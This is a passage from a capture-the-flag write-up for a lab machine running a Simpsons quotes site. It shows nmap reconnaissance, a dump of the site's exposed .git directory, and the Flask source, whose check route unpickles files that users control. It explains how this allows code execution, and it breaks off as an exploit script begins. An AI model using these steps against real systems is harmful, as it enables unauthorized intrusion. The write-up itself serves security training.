+</span></span></code></pre></td></tr></table></div></div><ul><li><code>-A</code>: aggressive scan; this enables OS detection (-O), version scanning (-sV), script scanning (-sC) and traceroute (&ndash;traceroute)</li><li><code>sT</code>: TCP scan</li><li><code>-n</code>: never do DNS resolution</li></ul><p>This time there is more information about the protocols:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>PORT      STATE SERVICE REASON  VERSION
+</span></span><span class=line><span class=cl>80/tcp    open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
+</span></span><span class=line><span class=cl>|_http-favicon: Unknown favicon MD5: CCD1870C3EB5C66B66D9E5A31B7A7DF6
+</span></span><span class=line><span class=cl>| http-methods: 
+</span></span><span class=line><span class=cl>|_  Supported Methods: GET HEAD OPTIONS
+</span></span><span class=line><span class=cl>|_http-title: Simpsons Fan Site
+</span></span><span class=line><span class=cl>|_http-trane-info: Problem with XML parsing of /evox/about
+</span></span><span class=line><span class=cl>65535/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+</span></span><span class=line><span class=cl>| ssh-hostkey: 
+</span></span><span class=line><span class=cl>|   2048 8d:82:0b:31:90:e4:c8:85:b2:53:8b:a1:7c:3b:65:e1 (RSA)
+</span></span><span class=line><span class=cl>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDroCKFvZBROo3eo64hlNjhERjTLQmRgbCaDGhoWgs6qf9AfuTfS7LMX82ayuBjV0OHbk6Saf3SKwyLFfyLKj/mo8yGNpGjsZQ9uiN6hlpO39oQyjo9dy5DUfAabcoq82ugii982GWeHlTShQJAhAsG+7Uov2mUbO3YkKph/PBEv3uuAnNebhxlk9eg01yuHkk+8iyP6+Qp9ZzAVZsXpSuoH0raBA7VOIlYnm4Wti1AHy3VUtvmrB4KwZQT8Q3ZyMbufWFZlDB0N0/cEvyXF0kKwRIT1hNjp4HUNo0dwcDOWuwvrWVUpH3/q8VXkZRN3fL2gHsIsfuh+AyThM14hf/h
+</span></span><span class=line><span class=cl>|   256 22:fc:6e:c3:55:00:85:0f:24:bf:f5:79:6c:92:8b:68 (ECDSA)
+</span></span><span class=line><span class=cl>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLX3HkUlvdwKR+Ijy9ChJwvV7ILAPCEver9hmIr546JbveSJNyvOiq6y3YxfQu3IXomvonySAU10Fo8wVQ7kxWk=
+</span></span><span class=line><span class=cl>|   256 0d:91:27:51:80:5e:2b:a3:81:0d:e9:d8:5c:9b:77:35 (ED25519)
+</span></span><span class=line><span class=cl>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJvWPxb1XOvko0SIhYrC5TYyQpU8tugg1qirZdtt3CXX
+</span></span><span class=line><span class=cl>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+</span></span><span class=line><span class=cl>OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+</span></span><span class=line><span class=cl>Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 4.2 (92%), Linux 3.12 (90%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 3.8 - 3.11 (90%)
+</span></span><span class=line><span class=cl>No exact OS matches for host (test conditions non-ideal).
+</span></span><span class=line><span class=cl>TCP/IP fingerprint:
+</span></span><span class=line><span class=cl>SCAN(V=7.70%E=4%D=5/1%OT=80%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=5AE8DD31%P=x86_64-unknown-linux-gnu)
+</span></span><span class=line><span class=cl>SEQ(SP=FB%GCD=1%ISR=10B%TI=Z%II=I%TS=8)
+</span></span><span class=line><span class=cl>OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)
+</span></span><span class=line><span class=cl>WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
+</span></span><span class=line><span class=cl>ECN(R=Y%DF=Y%TG=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)
+</span></span><span class=line><span class=cl>T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
+</span></span><span class=line><span class=cl>T2(R=N)
+</span></span><span class=line><span class=cl>T3(R=N)
+</span></span><span class=line><span class=cl>T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
+</span></span><span class=line><span class=cl>U1(R=N)
+</span></span><span class=line><span class=cl>IE(R=Y%DFI=N%TG=40%CD=S)
+</span></span></code></pre></td></tr></table></div></div><p>Finally there was a ssh server behind port 65535.</p><h3 id=service-http-enumeration--reconnaissance>Service (HTTP) Enumeration / Reconnaissance<a hidden class=anchor aria-hidden=true href=#service-http-enumeration--reconnaissance>#</a></h3><p>Let&rsquo;s load the website and take a look at the source code:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>          <span class=c>&lt;!-- 
+</span></span></span><span class=line><span class=cl><span class=c>          c8a74a098a60aaea1af98945bd707a7eab0ff4b0 - temporarily hide check
+</span></span></span><span class=line><span class=cl><span class=c>          &lt;li class=&#34;nav-item&#34;&gt;
+</span></span></span><span class=line><span class=cl><span class=c>            &lt;a class=&#34;nav-link&#34; href=&#34;/check&#34;&gt;Check Submission&lt;/a&gt;
+</span></span></span><span class=line><span class=cl><span class=c>          &lt;/li&gt;
+</span></span></span><span class=line><span class=cl><span class=c>          --&gt;</span>
+</span></span></code></pre></td></tr></table></div></div><p>There is a hash here, we can use <a href=https://inventory.raw.pm/tools.html#hashID>hashid</a> to identify the hash type.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ hashid c8a74a098a60aaea1af98945bd707a7eab0ff4b0
+</span></span><span class=line><span class=cl>Analyzing &#39;c8a74a098a60aaea1af98945bd707a7eab0ff4b0&#39;
+</span></span><span class=line><span class=cl>[+] SHA-1 
+</span></span><span class=line><span class=cl>[+] Double SHA-1 
+</span></span><span class=line><span class=cl>[+] RIPEMD-160 
+</span></span><span class=line><span class=cl>[+] Haval-160 
+</span></span><span class=line><span class=cl>[+] Tiger-160 
+</span></span><span class=line><span class=cl>[+] HAS-160 
+</span></span><span class=line><span class=cl>[+] LinkedIn 
+</span></span><span class=line><span class=cl>[+] Skein-256(160) 
+</span></span><span class=line><span class=cl>[+] Skein-512(160)
+</span></span></code></pre></td></tr></table></div></div><p>So the hash was probably generated with SHA1.</p><p>Now I will use a web directory and file scanner like <a href=http://dirb.sourceforge.net/>dirb</a> or <a href=https://inventory.raw.pm/tools.html#dirsearch>dirsearch</a> to try to find some interesting unlinked content.</p><p>With the help of one of the previously mentioned tool, I quickly found the <code>/.git/</code> directory, which is, of course, a git repository.</p><p>So I will dump http://10.10.10.70/.git/ in order to get the git repository locally and be able to browse it with the git CLI.</p><p>In order to dump the git repository, I used <a href=https://inventory.raw.pm/tools.html#GitTools>GitTools</a> and its dumper script:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=o>~/</span><span class=n>CTF</span><span class=o>/</span><span class=n>tools</span><span class=o>/</span><span class=n>GitTools</span><span class=o>/</span><span class=n>Dumper</span><span class=o>/</span><span class=n>gitdumper</span><span class=o>.</span><span class=n>sh</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=mf>10.10</span><span class=o>.</span><span class=mf>10.70</span><span class=o>/.</span><span class=n>git</span><span class=o>/</span> <span class=n>gitdir</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>cd</span> <span class=n>gitdir</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>git</span> <span class=o>--</span><span class=n>no</span><span class=o>-</span><span class=n>pager</span> <span class=nb>log</span> <span class=o>--</span><span class=n>oneline</span> 
+</span></span><span class=line><span class=cl><span class=mi>92</span><span class=n>eb5eb</span> <span class=p>(</span><span class=n>HEAD</span> <span class=o>-&gt;</span> <span class=n>master</span><span class=p>)</span> <span class=n>final</span>
+</span></span><span class=line><span class=cl><span class=mi>524</span><span class=n>f9dd</span> <span class=n>final</span>
+</span></span><span class=line><span class=cl><span class=mi>999</span><span class=n>b869</span> <span class=n>remove</span> <span class=n>a</span>
+</span></span><span class=line><span class=cl><span class=n>a762ade</span> <span class=n>a</span>
+</span></span><span class=line><span class=cl><span class=n>f197cbf</span> <span class=n>remove</span> <span class=n>doh</span>
+</span></span><span class=line><span class=cl><span class=mi>36</span><span class=n>acc97</span> <span class=n>add</span> <span class=n>doh</span>
+</span></span><span class=line><span class=cl><span class=n>fb79852</span> <span class=n>remove</span> <span class=n>f</span>
+</span></span><span class=line><span class=cl><span class=mi>64</span><span class=n>ed42c</span> <span class=n>add</span> <span class=n>f</span>
+</span></span><span class=line><span class=cl><span class=mi>7</span><span class=n>b15317</span> <span class=n>MORE</span> <span class=n>TROLLS</span>
+</span></span><span class=line><span class=cl><span class=n>a389475</span> <span class=n>trollface</span>
+</span></span><span class=line><span class=cl><span class=n>f9be9a9</span> <span class=n>add</span> <span class=n>note</span>
+</span></span><span class=line><span class=cl><span class=n>c8a74a0</span> <span class=n>temporarily</span> <span class=n>hide</span> <span class=n>check</span> <span class=n>due</span> <span class=n>to</span> <span class=n>vulerability</span>
+</span></span><span class=line><span class=cl><span class=n>e7bfbcf</span> <span class=n>initial</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>git</span> <span class=n>checkout</span> <span class=mi>524</span><span class=n>f9dd</span>
+</span></span></code></pre></td></tr></table></div></div><p>With <code>git checkout 524f9dd</code> I jumped to a previous commit tagged as <em>final</em>.</p><p>Then I reviewed a python file named <code>__init__.py</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span><span class=lnt>70
+</span><span class=lnt>71
+</span><span class=lnt>72
+</span><span class=lnt>73
+</span><span class=lnt>74
+</span><span class=lnt>75
+</span><span class=lnt>76
+</span><span class=lnt>77
+</span><span class=lnt>78
+</span><span class=lnt>79
+</span><span class=lnt>80
+</span><span class=lnt>81
+</span><span class=lnt>82
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>couchdb</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>cPickle</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>render_template</span><span class=p>,</span> <span class=n>request</span>
+</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>hashlib</span> <span class=kn>import</span> <span class=n>md5</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=o>.</span><span class=n>update</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>    <span class=n>DATABASE</span> <span class=o>=</span> <span class=s2>&#34;simpsons&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>db</span> <span class=o>=</span> <span class=n>couchdb</span><span class=o>.</span><span class=n>Server</span><span class=p>(</span><span class=s2>&#34;http://localhost:5984/&#34;</span><span class=p>)[</span><span class=n>app</span><span class=o>.</span><span class=n>config</span><span class=p>[</span><span class=s2>&#34;DATABASE&#34;</span><span class=p>]]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@app.errorhandler</span><span class=p>(</span><span class=mi>404</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>page_not_found</span><span class=p>(</span><span class=n>e</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>random</span><span class=o>.</span><span class=n>randrange</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=mi>2</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;&#39;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>random</span><span class=o>.</span><span class=n>choice</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>ascii_uppercase</span> <span class=o>+</span> <span class=n>string</span><span class=o>.</span><span class=n>digits</span><span class=p>)</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>random</span><span class=o>.</span><span class=n>randrange</span><span class=p>(</span><span class=mi>50</span><span class=p>,</span> <span class=mi>250</span><span class=p>)))</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s2>&#34;index.html&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s2>&#34;/&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>index</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s2>&#34;index.html&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s2>&#34;/quotes&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>quotes</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>quotes</span> <span class=o>=</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=nb>id</span> <span class=ow>in</span> <span class=n>db</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>quotes</span><span class=o>.</span><span class=n>append</span><span class=p>({</span><span class=s2>&#34;title&#34;</span><span class=p>:</span> <span class=n>db</span><span class=p>[</span><span class=nb>id</span><span class=p>][</span><span class=s2>&#34;character&#34;</span><span class=p>],</span> <span class=s2>&#34;text&#34;</span><span class=p>:</span> <span class=n>db</span><span class=p>[</span><span class=nb>id</span><span class=p>][</span><span class=s2>&#34;quote&#34;</span><span class=p>]})</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s1>&#39;quotes.html&#39;</span><span class=p>,</span> <span class=n>entries</span><span class=o>=</span><span class=n>quotes</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>WHITELIST</span> <span class=o>=</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;homer&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;marge&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;bart&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;lisa&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;maggie&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;moe&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;carl&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;krusty&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s2>&#34;/submit&#34;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s2>&#34;GET&#34;</span><span class=p>,</span> <span class=s2>&#34;POST&#34;</span><span class=p>])</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>submit</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>error</span> <span class=o>=</span> <span class=kc>None</span>
+</span></span><span class=line><span class=cl>    <span class=n>success</span> <span class=o>=</span> <span class=kc>None</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>method</span> <span class=o>==</span> <span class=s2>&#34;POST&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>char</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=p>[</span><span class=s2>&#34;character&#34;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>            <span class=n>quote</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=p>[</span><span class=s2>&#34;quote&#34;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=ow>not</span> <span class=n>char</span> <span class=ow>or</span> <span class=ow>not</span> <span class=n>quote</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=n>error</span> <span class=o>=</span> <span class=kc>True</span>
+</span></span><span class=line><span class=cl>            <span class=k>elif</span> <span class=ow>not</span> <span class=nb>any</span><span class=p>(</span><span class=n>c</span><span class=o>.</span><span class=n>lower</span><span class=p>()</span> <span class=ow>in</span> <span class=n>char</span><span class=o>.</span><span class=n>lower</span><span class=p>()</span> <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>WHITELIST</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>                <span class=n>error</span> <span class=o>=</span> <span class=kc>True</span>
+</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=c1># TODO - Pickle into dictionary instead, `check` is ready</span>
+</span></span><span class=line><span class=cl>                <span class=n>p_id</span> <span class=o>=</span> <span class=n>md5</span><span class=p>(</span><span class=n>char</span> <span class=o>+</span> <span class=n>quote</span><span class=p>)</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>                <span class=n>outfile</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;/tmp/&#34;</span> <span class=o>+</span> <span class=n>p_id</span> <span class=o>+</span> <span class=s2>&#34;.p&#34;</span><span class=p>,</span> <span class=s2>&#34;wb&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>		<span class=n>outfile</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>char</span> <span class=o>+</span> <span class=n>quote</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>		<span class=n>outfile</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>	        <span class=n>success</span> <span class=o>=</span> <span class=kc>True</span>
+</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>ex</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>error</span> <span class=o>=</span> <span class=kc>True</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template</span><span class=p>(</span><span class=s2>&#34;submit.html&#34;</span><span class=p>,</span> <span class=n>error</span><span class=o>=</span><span class=n>error</span><span class=p>,</span> <span class=n>success</span><span class=o>=</span><span class=n>success</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s2>&#34;/check&#34;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s2>&#34;POST&#34;</span><span class=p>])</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>check</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>path</span> <span class=o>=</span> <span class=s2>&#34;/tmp/&#34;</span> <span class=o>+</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=p>[</span><span class=s2>&#34;id&#34;</span><span class=p>]</span> <span class=o>+</span> <span class=s2>&#34;.p&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=n>path</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;p1&#34;</span> <span class=ow>in</span> <span class=n>data</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>item</span> <span class=o>=</span> <span class=n>cPickle</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>item</span> <span class=o>=</span> <span class=n>data</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;Still reviewing: &#34;</span> <span class=o>+</span> <span class=n>item</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>The file is describing the web application behavior.</p><p>I can quickly note there is a CouchDB server running on <code>localhost:5984</code>.</p><p>The web application is listing some Simpsons quotes and also allow us to submit some.
+So I can only submit quotes from whitelist Simpsons characters.
+Once submitted, the quote will be stored in a file name <code>"/tmp/" + md5(char + quote).hexdigest() + ".p</code>.
+So I know exactly where the file will be stored and how it will be named.</p><p>The normal behavior will be to submit a quote like this:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ curl -X POST -H &#39;Content-Type: application/x-www-form-urlencoded&#39; http://10.10.10.70/submit -d &#39;character=homer&amp;quote=testttttt&#39;
+</span></span></code></pre></td></tr></table></div></div><p>Then we can check the quote was saved by computing the file id which is used for the file name and request it:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ printf %s%s &#39;homer&#39; &#39;testttttt&#39; | md5sum | awk &#39;{ print $1 }&#39; | tr -d &#39;\n&#39;
+</span></span><span class=line><span class=cl>736dec3d7d835c35578fd1d4cf54d389
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>$ curl -X POST -H &#39;Content-Type: application/x-www-form-urlencoded&#39; http://10.10.10.70/check -d &#39;id=736dec3d7d835c35578fd1d4cf54d389&#39;
+</span></span></code></pre></td></tr></table></div></div><h3 id=exploiting-the-web-application-vulnerability>Exploiting the web application vulnerability<a hidden class=anchor aria-hidden=true href=#exploiting-the-web-application-vulnerability>#</a></h3><p>Did you spotted the vulnerability in the source code?</p><p>When doing the <em>check</em>, the web application is loading the content of the quote file into Pickle.</p><p>Note: Pickle is a python library used to serialize python objects.</p><p>Why this is a vulnerability? Because pickle deserialization can lead to arbitrary code execution if the data passed to it is unsafe, like in our case, controlled by the user.</p><p>There are various article on Internet explaining what is deserialization, Pickle or its exploitation like this one: <a href=https://dan.lousqui.fr/explaining-and-exploiting-deserialization-vulnerability-with-python-en.html>Explaining and exploiting deserialization vulnerability with Python</a>.</p><p>So here we are:</p><ol><li>We can control the data passed to cPickle (so we can make some code executed)</li><li>We know where the file is stored (so we can trigger the payload)</li><li>We have the source code (so we are able to build a valid payload targeting the web application)</li></ol><p>I created the following payload in python (name <code>pickle_exploit.py</code>):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span><span class=o>,</span> <span class=nn>cPickle</span><span class=o>,</span> <span class=nn>hashlib</span><span class=o>,</span> <span class=nn>requests</span><span class=o>,</span> <span class=nn>os</span>
